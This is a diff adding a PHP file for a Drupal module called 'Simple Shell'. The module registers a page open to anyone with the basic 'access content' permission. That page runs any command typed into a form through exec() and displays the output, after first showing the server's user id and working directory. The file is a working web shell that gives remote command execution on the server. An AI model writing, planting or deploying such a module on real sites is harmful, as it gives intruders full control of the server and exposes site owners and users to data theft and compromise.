@@ -1,0 +1,77 @@
+<?php
+function simple_shell_menu() {
+	$items = array();
+	$items['simple_shell'] = array(
+		'title' => 'Simple Shell',
+		'page callback' => '_simple_shell_page',
+		'access callback' => 'user_access',
+		'access arguments' => array('access content'),
+		'type' => MENU_CALLBACK,
+	);
+	return $items;
+}
+
+
+function _simple_shell_page() {
+	$form_state = form_state_defaults();
+	$form = drupal_build_form('simple_shell_form',$form_state);
+	form_get_cache($form['#build_id'], $form_state);
+
+	$id = [];
+	$retCode = 0;
+	exec('id',$id,$retCode);
+	$id = implode('&#10;',$id);
+	$pwd = [];
+	$retCode = 0;
+	exec('pwd',$pwd,$retCode);
+	$pwd = implode('&#10;',$pwd);
+
+
+	$command = 'id';
+	if (!empty($form_state['values']['command'])) {
+    	$command = $form_state['values']['command'];
+	}else{
+    	$form_state['values']['command'] = $command;
+	}
+
+	$ret = [];
+	$retCode = 0;
+	exec($command,$ret,$retCode);
+
+	$page = array(
+		'#theme' => 'page',
+		'#type' => 'page',
+		'content' => array(
+			'identity' => array(
+			    '#type' => 'markup',
+			    '#markup' => 'User is '.$id.'<br />PWD is '.$pwd,
+			),
+			'form' => $form,
+			'answer' => array(
+			    '#type' => 'markup',
+			    '#markup' => '<pre>'.implode('&#10;',$ret).'</pre>',
+			),
+		),
+	);
+	return $page;
+}
+
+function simple_shell_form($form, &$form_state) {
+	$form['command'] = array(
+		'#type' => 'textfield',
+		'#title' => 'Command',
+		'#required' => TRUE,
+	);
+	$form['submit_button'] = array(
+		'#type' => 'submit',
+		'#value' => t('Run'),
+	);
+
+	return $form;
+}
+
+function simple_shell_form_submit($node, &$form_state) {
+  // Rebuild the form in order to keep filter values.
+  $form_state['rebuild'] = TRUE;
+}
+
